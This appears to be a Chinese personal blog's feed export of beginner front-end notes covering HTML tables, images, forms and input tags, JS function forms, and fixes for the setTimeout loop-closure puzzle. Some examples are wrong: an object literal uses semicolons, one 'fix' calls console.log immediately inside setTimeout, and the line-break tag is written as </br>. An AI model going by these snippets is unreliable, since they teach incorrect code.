class="tag">&lt;<span class="name">th</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>44<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>44<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>44<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>55<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>55<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>55<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>英语<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>66<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>66<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>66<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>总分<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>166<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>166<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>166<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>排名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>123<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>123<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>123<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line">    <span class="selector-tag">table</span> &#123; </span><br><span class="line">        <span class="attribute">width</span>:<span class="number">500px</span>;</span><br><span class="line">        <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">        table-layout:auto;  //自动调整表格布局，表头信息多就宽一些</span><br><span class="line">        <span class="selector-tag">border-collapse</span>: <span class="selector-tag">collapse</span>;  </span><br><span class="line">        border-spacing: 0;  //修改border默认样式，即合并border并使border间距为0</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">tr</span>,<span class="selector-tag">td</span>,<span class="selector-tag">th</span> &#123;</span><br><span class="line">        <span class="attribute">border</span>:<span class="number">2px</span> solid pink;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/03/03/4TvReQAsSqaHnEp.png" alt="WX20220303-211724@2x.png"></p>
<hr>
<h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><p>作用：发出get请求，展示一张图片<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"ccc"</span> <span class="attr">src</span>=<span class="string">"/brown-cat.jpeg"</span> <span class="attr">alt</span>=<span class="string">"棕色小猫"</span> <span class="attr">width</span>=<span class="string">"800"</span>&gt;</span>  //width和height是img标签的属性，！！切记只需设置一项，另外一个会自适应</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    ccc.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">"恭喜加载成功啦~"</span>)</span></span><br><span class="line"><span class="javascript">    &#125;   <span class="comment">//监听图片是否加载成功</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    ccc.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">"抱歉图片不见啦~"</span>);</span></span><br><span class="line"><span class="javascript">        ccc.src= <span class="string">"/404.png"</span>;</span></span><br><span class="line"><span class="javascript">    &#125;  <span class="comment">//监听图片是否加载失败</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line">    * &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">        box-sizing: border-box;  //重置默认样式</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">img</span> &#123;</span><br><span class="line">        max-width: 100%;  //自适应宽度</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="form标签"><a href="#form标签" class="headerlink" title="form标签"></a>form标签</h2><p>作用：发出一个get或post请求，然后刷新页面<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/yyy"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">autocomplete</span>&gt;</span>  </span><br><span class="line">    //action用于控制请求哪个页面，method控制是POST还是GET</span><br><span class="line">    //autocomplete的用法：在form标签上加autocomplete，在input标签上加name=""</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span>  //默认是提交，给value赋值改变默认</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span>  //form标签里必须含有一个type=submit的标签，这样表单才能提交</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h2><ul>
<li><p>input与button标签的区别</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"搞起"</span> /&gt;</span>  //input标签里只能是纯文本</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>搞起<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>  //button标签里还可以有其他标签</span><br></pre></td></tr></table></figure>
</li>
<li><p>input标签里type属性的取值</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">required</span> /&gt;</span>  //required意为必须填写，否则不能提交</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> /&gt;</span>男  //单选</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> /&gt;</span>女</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> /&gt;</span>养猫  //多选</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> /&gt;</span>听歌</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> /&gt;</span>写代码</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span>  //选择单个文件</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">multiple</span> /&gt;</span>  //选择多个文件</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="其他输入标签"><a href="#其他输入标签" class="headerlink" title="其他输入标签"></a>其他输入标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">style</span>=<span class="string">"resize:none; width:50%; height:300px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>- 请选择 -<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>星期一<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span>星期二<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>JS函数</title>
    <url>/2022/03/16/JS%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 具名函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">形式参数<span class="number">1</span>， 形式参数<span class="number">2</span></span>)</span>&#123;</span><br><span class="line">    语句</span><br><span class="line">    <span class="keyword">return</span> 返回值</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 匿名函数（即具名函数去掉函数名，也叫函数表达式）</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 箭头函数</span></span><br><span class="line"><span class="keyword">let</span> f1 = <span class="function"><span class="params">x</span> =&gt;</span> x * x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f2 = <span class="function">(<span class="params">x,y</span>) =&gt;</span> x+y;  <span class="comment">// 圆括号不能省</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f3 = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;  <span class="comment">// 花括号不能省</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f4 = <span class="function">(<span class="params">x,y</span>) =&gt;</span> (&#123;</span><br><span class="line">    name: x;</span><br><span class="line">    age: y;</span><br><span class="line">&#125;)  <span class="comment">// 直接返回对象会报错，需要加圆括号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 用构造函数</span></span><br><span class="line"><span class="keyword">let</span> f5 = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'return x+y'</span>)  <span class="comment">// 基本没人用，所有函数都是Function构造出来的，包括Object、Array</span></span><br></pre></td></tr></table></figure>
<h2 id="函数自身与函数调用"><a href="#函数自身与函数调用" class="headerlink" title="函数自身与函数调用"></a>函数自身与函数调用</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">fn  <span class="comment">// 不会有任何结果，因为fn没有调用</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">fn()  <span class="comment">// 打印出hi，有圆括号()才是调用</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'hi'</span>)</span><br><span class="line"><span class="keyword">let</span> fn2 = fn</span><br><span class="line">fn2()</span><br><span class="line"><span class="comment">// fn保存了匿名函数的地址，这个地址被复制给了fn2，fn2()调用了匿名函数</span></span><br><span class="line"><span class="comment">// fn和fn2()都是匿名函数的引用而已，真正的函数不是fn也不是fn2</span></span><br></pre></td></tr></table></figure>
<h2 id="JS函数执行时机"><a href="#JS函数执行时机" class="headerlink" title="JS函数执行时机"></a>JS函数执行时机</h2><p>函数的调用时机不同，会得到不同结果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不知道会打印出什么，因为没有调用函数</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(a)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出2</span></span><br></pre></td></tr></table></figure>
<h3 id="异步函数"><a href="#异步函数" class="headerlink" title="异步函数"></a>异步函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会打印出6个6，而不是0,1,2,3,4,5</span></span><br><span class="line"><span class="comment">// setTimeout会等当前的for循环执行完，再去执行console.log(i)，而for循环执行完后，i=6，所以会打印出6个6</span></span><br></pre></td></tr></table></figure>
<p><strong><em>如何让上面的代码打印出0,1,2,3,4,5</em></strong></p>
<ol>
<li><p>for、let配合使用，let会单独创建一个作用域，每次循环会多创建一个i，相当于有6个i</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在for循环内部声明一个新的变量来存储i的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> x = i</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>立即执行函数，把当前for循环过程中的i传递进去，构建块级作用域</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i)</span><br><span class="line">        &#125;, <span class="number">0</span>)</span><br><span class="line">    &#125;)(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用setTimeout函数的第三个参数，会作为回调函数的第一个参数传入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="built_in">console</span>.log(i), <span class="number">1000</span>, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用try…catch…</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123; </span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">     <span class="keyword">throw</span> i;</span><br><span class="line">  &#125;<span class="keyword">catch</span>(i)&#123;</span><br><span class="line">     setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123; </span><br><span class="line">        <span class="built_in">console</span>.log(i) </span><br><span class="line">    &#125;, <span class="number">0</span>)    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用递归配合setTimeout()</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i &lt; <span class="number">6</span> ? setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(i);fn(++i),<span class="number">0</span>&#125;) : i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用promise</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    timeoutPromise(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeoutPromise</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">            resolve(<span class="literal">true</span>);</span><br><span class="line">        &#125;, <span class="number">0</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>HTML入门笔记1</title>
    <url>/2022/03/02/HTML%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h2><ul>
<li>全称：超文本标记语言（HyperText Markup Language）</li>
<li>发明者：由物理学家蒂姆·伯纳斯-李（Tim Berners-Lee）发明</li>
<li>特点：支持超链接，点击链接就可以跳转到其他网页，构成整个互联网</li>
</ul>
<h2 id="HTML起手写什么"><a href="#HTML起手写什么" class="headerlink" title="HTML起手写什么"></a>HTML起手写什么</h2><p>!+tab键生成HTML模板<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;  &lt;!-- 禁止缩放 --&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="全局属性"><a href="#全局属性" class="headerlink" title="全局属性"></a>全局属性</h2><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><p>全局属性是所有 HTML 元素共有的属性，它们可以用于所有元素，即使属性可能对某些元素不起作用。</p>
<h3 id="常见的全局属性："><a href="#常见的全局属性：" class="headerlink" title="常见的全局属性："></a>常见的全局属性：</h3><ol>
<li>class：以空格分隔元素的类名，CSS 和 Javascript 通过类选择器 (class selectors) 或 DOM 方法 ( document.getElementsByClassName) 来选择和访问特定的元素。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;mainMessage middle&quot;&gt;</span><br><span class="line">    这里是页面中间的信息</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>通过.mainMessage 或 .middle都可以为这个div添加样式</li>
</ul>
<ol start="2">
<li>id：定义唯一标识符，该标识符在整个文档中必须是唯一的。但不推荐使用，因为id不能命名为window上已有的全局变量，限制太多，不方便新手起名</li>
<li>style：规定元素的行内样式（inline style），它是Html的属性，而非CSS。样式展示的优先级行内样式&gt;CSS<br><img src="https://s2.loli.net/2022/03/02/RLQp7KXBFNr4cyP.png" alt="HTML-style.png"></li>
<li>tabindex：设置元素的 Tab 键控制次序，参数包括正数（按数字顺序访问）、0（最最最后一个访问）、负数（别来访问我）</li>
</ol>
<h2 id="章节标签🏷"><a href="#章节标签🏷" class="headerlink" title="章节标签🏷"></a>章节标签🏷</h2><p><img src="https://s2.loli.net/2022/03/02/NnXAbS7gZJjdO91.png" alt="HTML-章节标签.png"></p>
<h2 id="常用内容标签🏷"><a href="#常用内容标签🏷" class="headerlink" title="常用内容标签🏷"></a>常用内容标签🏷</h2><ol>
<li><p>加入强调</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">斜体强调&lt;em&gt;强调内容&lt;/em&gt;</span><br><span class="line">加粗强调&lt;strong&gt;强调内容&lt;/strong&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加入代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加入一行代码&lt;code&gt; &lt;/code&gt;</span><br><span class="line">加入多行代码&lt;pre&gt; &lt;/pre&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>水平横线与回车（无结束标签）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">回车&lt;/br&gt;</span><br><span class="line">水平横线&lt;/hr&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>无序列表&amp;有序列表&amp;自定义标签</p>
</li>
</ol>
<p>新闻信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;新闻1&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;新闻2&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p>
<p>豆瓣电影排行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;肖申克的救赎&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;教父&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure></p>
<p>自定义标签（只能有一个dt，但可以有多个dd）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;自定义列表title&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;自定义列表信息&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure></p>
<ol start="5">
<li>a标签</li>
</ol>
<p>创建一个可点击的图片<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.imooc.com&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;https://s2.loli.net/2022/03/02/8xgcYprTRe1ZnEk.png&quot; &gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
  <entry>
    <title>ES6常用知识点</title>
    <url>/2019/03/02/ES6%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>归纳ES6的常考问题<br><a id="more"></a></p>
<h3 id="var-let及const"><a href="#var-let及const" class="headerlink" title="var,let及const"></a>var,let及const</h3><p>我们都知道使用var声明的变量会被提升到作用域顶部，举个例子来看看三者的区别<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a = 1</span><br><span class="line">let b = 1</span><br><span class="line">const c = 1</span><br><span class="line">console.log(window.b) // undefined</span><br><span class="line">console.log(window. c) // undefined</span><br><span class="line"></span><br><span class="line">function test()&#123;</span><br><span class="line">  console.log(a)</span><br><span class="line">  let a</span><br><span class="line">&#125;</span><br><span class="line">test()</span><br></pre></td></tr></table></figure></p>
